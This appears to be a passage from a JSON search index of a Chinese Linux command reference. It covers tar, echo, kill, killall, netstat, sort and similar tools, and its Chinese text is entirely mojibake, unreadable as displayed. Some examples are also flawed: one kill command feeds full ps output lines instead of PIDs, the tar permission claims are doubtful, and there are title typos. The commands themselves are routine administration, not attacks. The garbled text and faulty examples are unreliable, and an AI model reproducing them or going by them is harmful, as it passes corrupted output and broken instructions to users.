ä»¥è¶…çº§ç”¨æˆ·ï¼ˆrootï¼‰èº«ä»½è¿è¡Œtarå‘½ä»¤, ä¿ç•™æ‰€æœ‰æ–‡ä»¶å’Œç›®å½•çš„æ‰€æœ‰æƒå’Œæƒé™ä¿¡æ¯ ä»¥æ™®é€šç”¨æˆ·èº«ä»½è¿è¡Œtarå‘½ä»¤ï¼Œåˆ™å‹ç¼©åçš„å½’æ¡£æ–‡ä»¶å°†ä¼šä¿ç•™æ–‡ä»¶çš„æ‰€æœ‰æƒä¿¡æ¯, ä½†ä¸ä¼šåŒ…å«æ–‡ä»¶çš„æƒé™ä¿¡æ¯ è§£å‹ç¼©æ–‡ä»¶æ—¶çš„ç”¨æˆ·æƒé™å˜åŒ–ï¼š ä»¥è¶…çº§ç”¨æˆ·èº«ä»½è¿è¡Œtarå‘½ä»¤æ¥è§£å‹ç¼©å½’æ¡£æ–‡ä»¶, åˆ™è§£å‹åçš„æ–‡ä»¶å°†ä¿æŒå…¶åŸå§‹çš„æ‰€æœ‰æƒå’Œæƒé™ä¿¡æ¯ã€‚ ä»¥æ™®é€šç”¨æˆ·èº«ä»½è¿è¡Œtarå‘½ä»¤æ¥è§£å‹ç¼©å½’æ¡£æ–‡ä»¶ åˆ™è§£å‹åçš„æ–‡ä»¶å°†è¢«èµ‹äºˆè¯¥ç”¨æˆ·çš„æ‰€æœ‰æƒï¼Œå¹¶ä¸”æ–‡ä»¶æƒé™å¯èƒ½ä¼šè¢«è®¾ç½®ä¸ºé»˜è®¤å€¼ï¼ˆé€šå¸¸æ˜¯è¾ƒä¸ºå®½æ¾çš„æƒé™ï¼‰. æ–‡ä»¶æ‰€æœ‰æƒæŒ‡, å±ä¸»å±ç»„ æ–‡ä»¶æƒé™æŒ‡, 755è¿™ç§","tags":"æ“ä½œç³»ç»Ÿ","url":"/yq-doc-source-docs-operating-system-linux-Linux-instruction-TAR.html","loc":"/yq-doc-source-docs-operating-system-linux-Linux-instruction-TAR.html"},{"title":"cat","text":"ç”¨äºè¿æ¥æ–‡ä»¶å¹¶æ‰“å°åˆ°æ ‡å‡†è¾“å‡ºè®¾å¤‡ä¸Šï¼Œ ç”±ç¬¬ä¸€è¡Œå¼€å§‹æ˜¾ç¤ºå†…å®¹ï¼Œå¹¶å°†æ‰€æœ‰å†…å®¹è¾“å‡º","tags":"æ“ä½œç³»ç»Ÿ","url":"/yq-doc-source-docs-operating-system-linux-Linux-instruction-cat.html","loc":"/yq-doc-source-docs-operating-system-linux-Linux-instruction-cat.html"},{"title":"echo","text":"å›æ˜¾ï¼Œå°±æ˜¯æ˜¾ç¤ºæ­£åœ¨æ‰§è¡Œçš„æ‰¹å¤„ç†å‘½ä»¤åŠæ‰§è¡Œçš„ç»“æœç­‰ é€‰é¡¹ echoé€‰é¡¹ -n: ä¸æ¢è¡Œè¾“å‡º -e: æ¿€æ´»è½¬ä¹‰å­—ç¬¦ã€‚ä½¿ç”¨-eé€‰é¡¹æ—¶ï¼Œè‹¥å­—ç¬¦ä¸²ä¸­å‡ºç°ä»¥ä¸‹å­—ç¬¦ï¼Œåˆ™ç‰¹åˆ«åŠ ä»¥å¤„ç†ï¼Œè€Œä¸ä¼šå°†å®ƒå½“æˆä¸€èˆ¬æ–‡å­—è¾“å‡ºï¼š \\a å‘å‡ºè­¦å‘Šå£°ï¼› \\b åˆ é™¤å‰ä¸€ä¸ªå­—ç¬¦ï¼› \\c æœ€åä¸åŠ ä¸Šæ¢è¡Œç¬¦å·ï¼› \\f æ¢è¡Œä½†å…‰æ ‡ä»æ—§åœç•™åœ¨åŸæ¥çš„ä½ç½®ï¼› \\n æ¢è¡Œä¸”å…‰æ ‡ç§»è‡³è¡Œé¦–ï¼› \\r å…‰æ ‡ç§»è‡³è¡Œé¦–ï¼Œä½†ä¸æ¢è¡Œï¼› \\t æ’å…¥tabï¼› \\v ä¸\\fç›¸åŒï¼› \\\\ æ’å…¥\\å­—ç¬¦ï¼› \\nnn æ’å…¥nnnï¼ˆå…«è¿›åˆ¶ï¼‰æ‰€ä»£è¡¨çš„ASCIIå­—ç¬¦ï¼› æŠ€å·§ åœ¨è„šæœ¬ä¸­echoè‡ªå¸¦è½¬ä¹‰åŠŸèƒ½ ä½¿ç”¨ echo -e \"\\e[1;36m ${ _strs } \\e[0m\\n\" æŠ€å·§ ä¾‹å­çš„è¿™ç§æƒ…å†µå®˜æ–¹å»ºè®®ä½¿ç”¨ ./printf å¯¹äºé¢œè‰²è¾“å‡ºè€Œè¨€, echoçš„ \\e å’Œ \\033 ä¸€ä¸ªæ•ˆæœ echo vs /bin/echo echo æ˜¯shellå†…ç½®å‘½ä»¤ /bin/echo æ˜¯å¯æ‰§è¡Œæ–‡ä»¶ é€šå¸¸æ¥è¯´ï¼Œå†…å»ºå‘½ä»¤ä¼šæ¯”å¤–éƒ¨å‘½ä»¤æ‰§è¡Œå¾—æ›´å¿«ï¼Œæ‰§è¡Œå¤–éƒ¨å‘½ä»¤æ—¶ä¸ä½†ä¼šè§¦å‘ç£ç›˜ I/Oï¼Œ è¿˜éœ€è¦ fork å‡ºä¸€ä¸ªå•ç‹¬çš„è¿›ç¨‹æ¥æ‰§è¡Œï¼Œæ‰§è¡Œå®Œæˆåå†é€€å‡ºã€‚ è€Œæ‰§è¡Œå†…å»ºå‘½ä»¤ç›¸å½“äºè°ƒç”¨å½“å‰ Shell è¿›ç¨‹çš„ä¸€ä¸ªå‡½æ•°ã€‚ ç›®å‰æ¥è¯´é‡åˆ°çš„ä¸€äº›åŒºåˆ«: /bin/echo å‚æ•°è§¦å‘ Argument list too longçš„ä¸´ç•Œç‚¹æ˜¯ 131072 echo æš‚æ—¶æ²¡æµ‹è¯•åˆ°æœ‰é™åˆ¶ è¾“å‡ºå¸¦é¢œè‰² é¢œè‰²è¡¨è§ /docs/æ“ä½œç³»ç»Ÿ/linux/æ¦‚å¿µæ€§/é¢œè‰²è¡¨ä¸ä»£ç è¡¨ æ ¼å¼: echo -e \"\\033[å­—èƒŒæ™¯é¢œè‰²;å­—ä½“é¢œè‰²må­—ç¬¦ä¸²\\033[0m\" ä¾‹å¦‚ æ‰“å°çº¢è‰²è¾“å‡º: echo -e \"\\e[1;31m å†…å®¹ \\e[0m\" #\\e[1;31m å°†é¢œè‰²è®¾ç½®ä¸ºçº¢è‰² #\\e[0m å°†é¢œè‰²é‡æ–°ç½®å› #é¢œè‰²ç ï¼šé‡ç½®=0ï¼Œé»‘è‰²=30ï¼Œçº¢è‰²=31ï¼Œç»¿è‰²=32ï¼Œé»„è‰²=33ï¼Œè“è‰²=34ï¼Œæ´‹çº¢=35ï¼Œé’è‰²=36ï¼Œç™½è‰²=37 ANSIæ§åˆ¶ç çš„è¯´æ˜: \\33[0m å…³é—­æ‰€æœ‰å±æ€§ \\33[1m è®¾ç½®é«˜äº®åº¦ \\33[4m ä¸‹åˆ’çº¿ \\33[5m é—ªçƒ \\33[7m åæ˜¾ \\33[8m æ¶ˆéš \\33[30m -- \\33[37m è®¾ç½®å‰æ™¯è‰² \\33[40m -- \\33[47m è®¾ç½®èƒŒæ™¯è‰² \\33[nA å…‰æ ‡ä¸Šç§»nè¡Œ \\33[nB å…‰æ ‡ä¸‹ç§»nè¡Œ \\33[nC å…‰æ ‡å³ç§»nè¡Œ \\33[nD å…‰æ ‡å·¦ç§»nè¡Œ \\33[y;xHè®¾ç½®å…‰æ ‡ä½ç½® \\33[2J æ¸…å± \\33[K æ¸…é™¤ä»å…‰æ ‡åˆ°è¡Œå°¾çš„å†…å®¹ \\33[s ä¿å­˜å…‰æ ‡ä½ç½® \\33[u æ¢å¤å…‰æ ‡ä½ç½® \\33[?25l éšè—å…‰æ ‡ \\33[?25h æ˜¾ç¤ºå…‰æ ‡ #\\eå’Œ\\033ä¸€ä¸ªæ•ˆæœ","tags":"æ“ä½œç³»ç»Ÿ","url":"/yq-doc-source-docs-operating-system-linux-Linux-instruction-echo.html","loc":"/yq-doc-source-docs-operating-system-linux-Linux-instruction-echo.html"},{"title":"exec","text":"ç”¨äºè°ƒç”¨å¹¶æ‰§è¡ŒæŒ‡ä»¤çš„å‘½ä»¤ã€‚ execå‘½ä»¤é€šå¸¸ç”¨åœ¨shellè„šæœ¬ç¨‹åºä¸­ï¼Œå¯ä»¥è°ƒç”¨å…¶ä»–çš„å‘½ä»¤ã€‚ å¦‚æœåœ¨å½“å‰ç»ˆç«¯ä¸­ä½¿ç”¨å‘½ä»¤ï¼Œåˆ™å½“æŒ‡å®šçš„å‘½ä»¤æ‰§è¡Œå®Œæ¯•åä¼šç«‹å³é€€å‡ºç»ˆç«¯ã€‚ è¯­æ³•: exec(é€‰é¡¹)(å‚æ•°) é€‰é¡¹ -c åœ¨ç©ºç¯å¢ƒä¸­æ‰§è¡ŒæŒ‡å®šçš„å‘½ä»¤ã€‚ å¦‚: exec -c echo Linux C++ # è°ƒç”¨å‘½ä»¤æ‰§è¡Œï¼Œæ‰§è¡Œå®Œæ¯•åé€€å‡º","tags":"æ“ä½œç³»ç»Ÿ","url":"/yq-doc-source-docs-operating-system-linux-Linux-instruction-exec.html","loc":"/yq-doc-source-docs-operating-system-linux-Linux-instruction-exec.html"},{"title":"groupadd","text":"ç”¨äºåˆ›å»ºä¸€ä¸ªæ–°çš„å·¥ä½œç»„","tags":"æ“ä½œç³»ç»Ÿ","url":"/yq-doc-source-docs-operating-system-linux-Linux-instruction-groupadd.html","loc":"/yq-doc-source-docs-operating-system-linux-Linux-instruction-groupadd.html"},{"title":"gunzip","text":"ç”¨æ¥è§£å‹ç¼©æ–‡ä»¶ï¼ˆç­‰ä»·äºgzip -dï¼‰ ç›¸å…³æŒ‡ä»¤ gzip","tags":"æ“ä½œç³»ç»Ÿ","url":"/yq-doc-source-docs-operating-system-linux-Linux-instruction-gunzip.html","loc":"/yq-doc-source-docs-operating-system-linux-Linux-instruction-gunzip.html"},{"title":"ifcofig","text":"é…ç½®å’Œæ˜¾ç¤ºLinuxç³»ç»Ÿç½‘å¡çš„ç½‘ç»œå‚æ•°","tags":"æ“ä½œç³»ç»Ÿ","url":"/yq-doc-source-docs-operating-system-linux-Linux-instruction-ifconfig.html","loc":"/yq-doc-source-docs-operating-system-linux-Linux-instruction-ifconfig.html"},{"title":"kill","text":"ç±»ä¼¼çš„æŒ‡ä»¤: /docs/æ“ä½œç³»ç»Ÿ/linux/linuxæŒ‡ä»¤/killall /docs/æ“ä½œç³»ç»Ÿ/linux/linuxæŒ‡ä»¤/pkill å‘é€ä¿¡å· Linux kill å‘½ä»¤ç”¨äºåˆ é™¤æ‰§è¡Œä¸­çš„ç¨‹åºæˆ–å·¥ä½œã€‚ kill å¯å°†æŒ‡å®šçš„ä¿¡æ¯é€è‡³ç¨‹åºã€‚ é¢„è®¾çš„ä¿¡æ¯ä¸º SIGTERM(15)ï¼Œå¯å°†æŒ‡å®šç¨‹åºç»ˆæ­¢ã€‚ è‹¥ä»æ— æ³•ç»ˆæ­¢è¯¥ç¨‹åºï¼Œå¯ä½¿ç”¨ SIGKILL(9) ä¿¡æ¯å°è¯•å¼ºåˆ¶åˆ é™¤ç¨‹åºã€‚ ç¨‹åºæˆ–å·¥ä½œçš„ç¼–å·å¯åˆ©ç”¨ ps æŒ‡ä»¤æˆ– jobs æŒ‡ä»¤æŸ¥çœ‹ã€‚ è¯­æ³•: kill [-s <ä¿¡æ¯åç§°æˆ–ç¼–å·>][ç¨‹åº] æˆ– kill [-l <ä¿¡æ¯ç¼–å·>] å‚æ•°è¯´æ˜: -l <ä¿¡æ¯ç¼–å·> è‹¥ä¸åŠ <ä¿¡æ¯ç¼–å·>é€‰é¡¹ï¼Œåˆ™ -l å‚æ•°ä¼šåˆ—å‡ºå…¨éƒ¨çš„ä¿¡æ¯åç§°ã€‚ -s <ä¿¡æ¯åç§°æˆ–ç¼–å·> æŒ‡å®šè¦é€å‡ºçš„ä¿¡æ¯ã€‚ [ç¨‹åº] [ç¨‹åº]å¯ä»¥æ˜¯ç¨‹åºçš„PIDæˆ–æ˜¯PGIDï¼Œä¹Ÿå¯ä»¥æ˜¯å·¥ä½œç¼–å·ã€‚ ä½¿ç”¨ kill -l å‘½ä»¤åˆ—å‡ºæ‰€æœ‰å¯ç”¨ä¿¡å· æœ€å¸¸ç”¨çš„ä¿¡å·æ˜¯: 1 (HUP)ï¼šé‡æ–°åŠ è½½è¿›ç¨‹ã€‚ 9 (KILL)ï¼šæ€æ­»ä¸€ä¸ªè¿›ç¨‹ã€‚ 15 (TERM)ï¼šæ­£å¸¸åœæ­¢ä¸€ä¸ªè¿›ç¨‹ã€‚ å‘é€SIGHUPä¿¡å·ï¼Œå¯ä»¥ä½¿ç”¨ä¸€ä¸‹ä¿¡å·: kill -HUP pid å½»åº•æ€æ­»è¿›ç¨‹: kill -9 123456 # æˆ–è€… kill -KILL 123456 æ€æ­»æŒ‡å®šç”¨æˆ·æ‰€æœ‰è¿›ç¨‹: kill -9 $(ps -ef | grep hnlinux) //æ–¹æ³•ä¸€ è¿‡æ»¤å‡ºhnlinuxç”¨æˆ·è¿›ç¨‹ kill -u hnlinux //æ–¹æ³•äºŒ","tags":"æ“ä½œç³»ç»Ÿ","url":"/yq-doc-source-docs-operating-system-linux-Linux-instruction-kill.html","loc":"/yq-doc-source-docs-operating-system-linux-Linux-instruction-kill.html"},{"title":"killall","text":"ç›¸ä¼¼çš„æŒ‡ä»¤: /docs/æ“ä½œç³»ç»Ÿ/linux/linuxæŒ‡ä»¤/pkill /docs/æ“ä½œç³»ç»Ÿ/linux/linuxæŒ‡ä»¤/kill ä½¿ç”¨è¿›ç¨‹çš„åç§°æ¥æ€æ­»ä¸€ç»„è¿›ç¨‹ Linux killall ç”¨äºæ€æ­»ä¸€ä¸ªè¿›ç¨‹ï¼Œä¸ kill ä¸åŒçš„æ˜¯å®ƒä¼šæ€æ­»æŒ‡å®šåå­—çš„æ‰€æœ‰è¿›ç¨‹ã€‚ kill å‘½ä»¤æ€æ­»æŒ‡å®šè¿›ç¨‹ PIDï¼Œéœ€è¦é…åˆ ps ä½¿ç”¨ï¼Œè€Œ killall ç›´æ¥å¯¹è¿›ç¨‹å¯¹åå­—è¿›è¡Œæ“ä½œï¼Œæ›´åŠ æ–¹ä¾¿ã€‚ è¯­æ³•: killall [é€‰é¡¹] name å‚æ•°è¯´æ˜: name ï¼š è¿›ç¨‹å é€‰é¡¹åŒ…å«å¦‚ä¸‹å‡ ä¸ªå‚æ•°: -e | --exact ï¼š è¿›ç¨‹éœ€è¦å’Œåå­—å®Œå…¨ç›¸ç¬¦ -I | --ignore-case ï¼šå¿½ç•¥å¤§å°å†™ -g | --process-group ï¼šç»“æŸè¿›ç¨‹ç»„ -i | --interactive ï¼šç»“æŸä¹‹å‰è¯¢é—® -l | --list ï¼šåˆ—å‡ºæ‰€æœ‰çš„ä¿¡å·åç§° -q | --quite ï¼šè¿›ç¨‹æ²¡æœ‰ç»“æŸæ—¶ï¼Œä¸è¾“å‡ºä»»ä½•ä¿¡æ¯ -r | --regexp ï¼šå°†è¿›ç¨‹åæ¨¡å¼è§£é‡Šä¸ºæ‰©å±•çš„æ­£åˆ™è¡¨è¾¾å¼ã€‚ -s | --signal ï¼šå‘é€æŒ‡å®šä¿¡å· -u | --user ï¼šç»“æŸæŒ‡å®šç”¨æˆ·çš„è¿›ç¨‹ -v | --verbose ï¼šæ˜¾ç¤ºè¯¦ç»†æ‰§è¡Œè¿‡ç¨‹ -w | --wait ï¼šç­‰å¾…æ‰€æœ‰çš„è¿›ç¨‹éƒ½ç»“æŸ -V |--version ï¼šæ˜¾ç¤ºç‰ˆæœ¬ä¿¡æ¯ --help ï¼šæ˜¾ç¤ºå¸®åŠ©ä¿¡æ¯ å®ä¾‹, ç»“æŸæ‰€æœ‰çš„ php-fpm è¿›ç¨‹: killall -9 php-fpm","tags":"æ“ä½œç³»ç»Ÿ","url":"/yq-doc-source-docs-operating-system-linux-Linux-instruction-killLALL.html","loc":"/yq-doc-source-docs-operating-system-linux-Linux-instruction-killLALL.html"},{"title":"lsb_release","text":"å¦‚æœæ²¡æœ‰, ä½¿ç”¨ä»¥ä¸‹æŒ‡ä»¤å®‰è£…: apt install lsb-core LSBæ˜¯Linux Standard Baseçš„ç¼©å†™, Isb_releaseå‘½ä»¤ç”¨æ¥æ˜¾ç¤ºLSBå’Œç‰¹å®šç‰ˆæœ¬çš„ç›¸å…³ä¿¡æ¯(æŸ¥çœ‹å½“å‰ç³»ç»Ÿçš„å‘è¡Œç‰ˆä¿¡æ¯)ã€‚ è¯­æ³•: lsb_release [å‚æ•°] é€‰é¡¹å‚æ•° -i æ˜¾ç¤ºç³»ç»Ÿåç§°ç®€å†™ -v æ˜¾ç¤ºlsbç‰ˆæœ¬ä¿¡æ¯ -d æ˜¾ç¤ºç³»ç»Ÿå…¨ç§°å’Œç‰ˆæœ¬å· -r æ˜¾ç¤ºç‰ˆæœ¬å· -a æ˜¾ç¤ºLSBæ‰€æœ‰ä¿¡æ¯ -h æŸ¥çœ‹lsb_releaseæ”¯æŒçš„æ‰€æœ‰å‚æ•° æ— å‚æ•°æ—¶é»˜è®¤åŠ ä¸Š-v å‚æ•°ã€‚","tags":"æ“ä½œç³»ç»Ÿ","url":"/yq-doc-source-docs-operating-system-linux-Linux-instruction-lsb_release.html","loc":"/yq-doc-source-docs-operating-system-linux-Linux-instruction-lsb_release.html"},{"title":"man","text":"manå¯ä»¥æŸ¥çœ‹å‘½ä»¤çš„ç”¨æ³• ä¸€èˆ¬å¯ä»¥å…ˆä½¿ç”¨\"whatis â€˜å‘½ä»¤'\"æ¥æŸ¥çœ‹å‘½ä»¤ç›¸å…³ä¿¡æ¯ï¼Œ å†ä½¿ç”¨\"man â€˜å‘½ä»¤'\"æ¥æŸ¥çœ‹å‘½ä»¤çš„å…·ä½“ä½¿ç”¨ ç¿»å±: å‘åç¿»ä¸€å±ï¼šspace(ç©ºæ ¼é”®) å‘å‰ç¿»ä¸€å±ï¼šb å‘åç¿»ä¸€è¡Œï¼šEnter(å›è½¦é”®) å‘å‰ç¿»ä¸€è¡Œï¼šk æŒ‰é”®ä¸ç”¨å¤„: æŒ‰é”® ç”¨å¤„ ç©ºæ ¼é”® å‘ä¸‹ç¿»ä¸€é¡µã€‚ [Page Down] å‘ä¸‹ç¿»ä¸€é¡µã€‚ [Page Up] å‘ä¸Šç¿»ä¸€é¡µã€‚ [HOME] ç›´æ¥å‰å¾€é¦–é¡µã€‚ [END] ç›´æ¥å‰å¾€å°¾é¡µã€‚ /å…³é”®è¯ ä»ä¸Šè‡³ä¸‹æœç´¢æŸä¸ªå…³é”®è¯,å¦‚\"/linux\"ã€‚ ?å…³é”®è¯ ä»ä¸‹è‡³ä¸Šæœç´¢æŸä¸ªå…³é”®è¯,å¦‚\"?linux\"ã€‚ n å®šä½åˆ°ä¸‹ä¸€ä¸ªæœç´¢åˆ°çš„å…³é”®è¯ã€‚ N å®šä½åˆ°ä¸Šä¸€ä¸ªæœç´¢åˆ°çš„å…³é”®è¯ã€‚ q é€€å‡ºå¸®åŠ©æ–‡æ¡£ã€‚","tags":"æ“ä½œç³»ç»Ÿ","url":"/yq-doc-source-docs-operating-system-linux-Linux-instruction-man.html","loc":"/yq-doc-source-docs-operating-system-linux-Linux-instruction-man.html"},{"title":"netstat","text":"Ubuntuå®‰è£…: apt install net-tools -y æ³¨è§£ net-toolsåŒ…å«arp, ifconfig, netstat, rarp, nameif and routeå‘½ä»¤ï¼Œå¦‚æœä½¿ç”¨è¿™äº›å‘½ä»¤æŠ¥é”™ï¼Œå¯ä»¥å°è¯•å®‰è£…ã€‚ åŠŸèƒ½ æŸ¥çœ‹ç½‘ç»œçŠ¶æ€ Linux netstat å‘½ä»¤ç”¨äºæ˜¾ç¤ºç½‘ç»œçŠ¶æ€ã€‚åˆ©ç”¨ netstat æŒ‡ä»¤å¯è®©ä½ å¾—çŸ¥æ•´ä¸ª Linux ç³»ç»Ÿçš„ç½‘ç»œæƒ…å†µã€‚ ä½¿ç”¨: netstat [-acCeFghilMnNoprstuvVwx][-A<ç½‘ç»œç±»å‹>][--ip] é€‰é¡¹å‚æ•° netstaté€‰é¡¹å‚æ•° é€‰é¡¹ å«ä¹‰ -a/--all æ˜¾ç¤ºæ‰€æœ‰è¿çº¿ä¸­çš„Socket -n/--numeric ä»¥ipå½¢å¼æ˜¾ç¤ºå½“å‰å»ºç«‹çš„æœ‰æ•ˆè¿æ¥å’Œç«¯å£.ç›´æ¥ä½¿ç”¨IPåœ°å€ï¼Œè€Œä¸é€šè¿‡åŸŸåæœåŠ¡å™¨ -u/--udp æ˜¾ç¤ºUDPä¼ è¾“åè®®çš„è¿çº¿çŠ¶å†µã€‚ -t/--tcp æ˜¾ç¤ºTCPä¼ è¾“åè®®çš„è¿çº¿çŠ¶å†µã€‚ -p/--programs æ˜¾ç¤ºå¯¹åº”PIDä¸ç¨‹åºå. æ˜¾ç¤ºæ­£åœ¨ä½¿ç”¨Socketçš„ç¨‹åºè¯†åˆ«ç å’Œç¨‹åºåç§°ã€‚ A<ç½‘ç»œç±»å‹>æˆ–--<ç½‘ç»œç±»å‹> åˆ—å‡ºè¯¥ç½‘ç»œç±»å‹è¿çº¿ä¸­çš„ç›¸å…³åœ°å€ã€‚ -c/--continuous æŒç»­åˆ—å‡ºç½‘ç»œçŠ¶æ€ã€‚ -C/--cache æ˜¾ç¤ºè·¯ç”±å™¨é…ç½®çš„å¿«å–ä¿¡æ¯ã€‚ -e/--extend æ˜¾ç¤ºç½‘ç»œå…¶ä»–ç›¸å…³ä¿¡æ¯ã€‚ -F/--fib æ˜¾ç¤ºè·¯ç”±ç¼“å­˜ã€‚ -g/--groups æ˜¾ç¤ºå¤šé‡å¹¿æ’­åŠŸèƒ½ç¾¤ç»„ç»„å‘˜åå•ã€‚ -h/--help åœ¨çº¿å¸®åŠ©ã€‚ -i --interfaces æ˜¾ç¤ºç½‘ç»œç•Œé¢ä¿¡æ¯è¡¨å•ã€‚ -l/--listening æ˜¾ç¤ºç›‘æ§ä¸­çš„æœåŠ¡å™¨çš„Socketã€‚ -M/--masquerade æ˜¾ç¤ºä¼ªè£…çš„ç½‘ç»œè¿çº¿ã€‚ -N/--netlink/--symbolic æ˜¾ç¤ºç½‘ç»œç¡¬ä»¶å¤–å›´è®¾å¤‡çš„ç¬¦å·è¿æ¥åç§°ã€‚ -o/--timers æ˜¾ç¤ºè®¡æ—¶å™¨ã€‚ -r/--route æ˜¾ç¤ºRouting Tableã€‚ -s/--statistics æ˜¾ç¤ºç½‘ç»œå·¥ä½œä¿¡æ¯ç»Ÿè®¡è¡¨ã€‚ -v/--verbose æ˜¾ç¤ºæŒ‡ä»¤æ‰§è¡Œè¿‡ç¨‹ã€‚ -V/--version æ˜¾ç¤ºç‰ˆæœ¬ä¿¡æ¯ã€‚ -w/--raw æ˜¾ç¤ºRAWä¼ è¾“åè®®çš„è¿çº¿çŠ¶å†µã€‚ -x/--unix æ­¤å‚æ•°çš„æ•ˆæœå’ŒæŒ‡å®š\"-A unix\"å‚æ•°ç›¸åŒã€‚ --ip/--inet æ­¤å‚æ•°çš„æ•ˆæœå’ŒæŒ‡å®š\"-A inet\"å‚æ•°ç›¸åŒã€‚ æ³¨è§£ å¸¸ç”¨: netstat -anutp å¸¸ç”¨: #åˆ—å‡ºæ‰€æœ‰ç«¯å£ (åŒ…æ‹¬ç›‘å¬å’Œæœªç›‘å¬çš„) netstat -a #åˆ—å‡ºæ‰€æœ‰ç«¯å£ netstat -at #åˆ—å‡ºæ‰€æœ‰tcpç«¯å£ netstat -au #åˆ—å‡ºæ‰€æœ‰udpç«¯å£ #åˆ—å‡ºæ‰€æœ‰å¤„äºç›‘å¬çŠ¶æ€çš„ Socket netstat -l #åªæ˜¾ç¤ºç›‘å¬ç«¯å£ netstat -lt #åªåˆ—å‡ºæ‰€æœ‰ç›‘å¬ tcp ç«¯å£ netstat -lu #åªåˆ—å‡ºæ‰€æœ‰ç›‘å¬ udp ç«¯å£ netstat -lx #åªåˆ—å‡ºæ‰€æœ‰ç›‘å¬ UNIX ç«¯å£ netstat -antup #æ˜¾ç¤ºæ‰€æœ‰ åŠ å ç”¨ç¨‹åºå å†…å®¹è§£é‡Š: Proto è¯¥è”æœºçš„å°åŒ…åè®® Recv-Q éç”±ç”¨æˆ·ç¨‹åºè¿æ¥æ‰€å¤åˆ¶è€Œæ¥çš„æ€» bytes Send-Q ç”±è¿œç¨‹ä¸»æœºæ‰€ä¼ é€è€Œæ¥ï¼Œä½†ä¸å…·æœ‰ACKæ ‡å¿—çš„æ€»bytesæ•°ï¼Œæ„æŒ‡ä¸»åŠ¨è”æœºSYNæˆ–å…¶ä»–æ ‡å¿—çš„å°åŒ…æ‰€å çš„bytesæ•° Local Address æœ¬åœ°åœ°å€ Foreign Address è¿œç¨‹ä¸»æœºåœ°å€ stat çŠ¶æ€æ ï¼Œæœ‰ä»¥ä¸‹ ESTABLISED å·²å»ºç«‹çš„è”æœºçš„çŠ¶æ€ SYNC_SENT å‘å‡ºä¸»åŠ¨è”æœºçš„è”æœºå°åŒ… SYNC_RECV æ¥æ”¶åˆ°ä¸€ä¸ªè¦æ±‚è”æœºçš„ä¸»åŠ¨è”æœºå°åŒ… FIN_WAIT1 è¯¥æ’æ§½æœåŠ¡socketå·²ä¸­æ–­ï¼Œè¯¥è”æœºæ­£åœ¨æ–­çº¿ä¸­ FIN_WAIT2 è¯¥è”æœºå·²æŒ‚æ–­ï¼Œä½†æ­£åœ¨ç­‰å¾…å¯¹æ–¹ä¸»æœºå“åº”æ–­çº¿ç¡®è®¤çš„å°åŒ… TIME_WAIT è¯¥è”æœºå·²æŒ‚æ–­ï¼Œä½†socketè¿˜åœ¨ç½‘ç»œä¸Šç­‰å¾…ç»“æŸ LISTEN é€šå¸¸åœ¨æœåŠ¡çš„ç›‘å¬portï¼Œå¯ä½¿ç”¨ -læŸ¥è¯¢","tags":"æ“ä½œç³»ç»Ÿ","url":"/yq-doc-source-docs-operating-system-linux-Linux-instruction-netStat.html","loc":"/yq-doc-source-docs-operating-system-linux-Linux-instruction-netStat.html"},{"title":"route","text":"æ˜¾ç¤ºå¹¶è®¾ç½®Linuxå†…æ ¸ä¸­çš„ç½‘ç»œè·¯ç”±è¡¨ï¼Œrouteå‘½ä»¤è®¾ç½®çš„è·¯ç”±ä¸»è¦æ˜¯é™æ€è·¯ç”±","tags":"æ“ä½œç³»ç»Ÿ","url":"/yq-doc-source-docs-operating-system-linux-Linux-instruction-route.html","loc":"/yq-doc-source-docs-operating-system-linux-Linux-instruction-route.html"},{"title":"sort","text":"å¯¹æ–‡æœ¬å†…å®¹ä»¥è¡Œä¸ºå•ä½è¿›è¡Œ ASCII ç æ’åº, é»˜è®¤æŒ‰ç…§å‡åºè¿›è¡Œæ’åº -n , --numeric-sort æ ¹æ®æ•°å­—æ’åº -r , --reverse å°†ç»“æœå€’åºæ’åˆ—ã€‚ -k , --key= KEYDEF é€šè¿‡ä¸€ä¸ªkeyæ’åºï¼›KEYDEFç»™å‡ºä½ç½®å’Œç±»å‹ å°±æ˜¯æŒ‡å®šæ’åºçš„åˆ—å·, ç¬¬å‡ åˆ—, æ”¯æŒå¤šä¸ª, æŒ‰ç…§æŒ‡å®šçš„é¡ºåº (é»˜è®¤ç¬¬ä¸€è¡Œ) -t <seq> æŒ‡å®šåˆ†éš”ç¬¦ -o <file> å°†ç»“æœè¾“å‡ºåˆ°æŒ‡å®šæ–‡ä»¶ -b å¿½ç•¥æ¯è¡Œå‰é¢å¼€å§‹å‡ºçš„ç©ºæ ¼å­—ç¬¦ã€‚ -c æ£€æŸ¥æ–‡ä»¶æ˜¯å¦å·²ç»æŒ‰ç…§é¡ºåºæ’åºã€‚ -d æ’åºæ—¶ï¼Œå¤„ç†è‹±æ–‡å­—æ¯ã€æ•°å­—åŠç©ºæ ¼å­—ç¬¦å¤–ï¼Œå¿½ç•¥å…¶ä»–çš„å­—ç¬¦ã€‚ -f å¿½ç•¥å¤§å°å†™. æ’åºæ—¶ï¼Œå°†å°å†™å­—æ¯è§†ä¸ºå¤§å†™å­—æ¯ã€‚ -i æ’åºæ—¶ï¼Œé™¤äº†040è‡³176ä¹‹é—´çš„ASCIIå­—ç¬¦å¤–ï¼Œå¿½ç•¥å…¶ä»–çš„å­—ç¬¦ã€‚ -m å°†å‡ ä¸ªæ’åºå¥½çš„æ–‡ä»¶è¿›è¡Œåˆå¹¶ã€‚ -M å°†å‰é¢3ä¸ªå­—æ¯ä¾ç…§æœˆä»½çš„ç¼©å†™è¿›è¡Œæ’åºã€‚ -n ä¾ç…§æ•°å€¼çš„å¤§å°æ’åºã€‚ -u å¯¹ç»“æœå»é‡. æ„å‘³ç€æ˜¯å”¯ä¸€çš„(unique)ï¼Œè¾“å‡ºçš„ç»“æœæ˜¯å»å®Œé‡äº†çš„ã€‚ -t <åˆ†éš”å­—ç¬¦> æŒ‡å®šæ’åºæ—¶æ‰€ç”¨çš„æ ä½åˆ†éš”å­—ç¬¦ã€‚ -o <è¾“å‡ºæ–‡ä»¶> å°†æ’åºåçš„ç»“æœå­˜å…¥æŒ‡å®šçš„æ–‡ä»¶ã€‚ å…¶ä»–: +<èµ·å§‹æ ä½>-<ç»“æŸæ ä½> ä»¥æŒ‡å®šçš„æ ä½æ¥æ’åºï¼ŒèŒƒå›´ç”±èµ·å§‹æ ä½åˆ°ç»“æŸæ ä½çš„å‰ä¸€æ ä½ã€‚ å¦‚æŒ‡å®šä»¥ç¬¬å…­, ä¸ƒåˆ—çš„é¡ºåºæ’åº(å†™ä¸€èµ·ä¹‹æ”¯æŒå•æ•°è¡Œå·): ls -lh | sort -k6 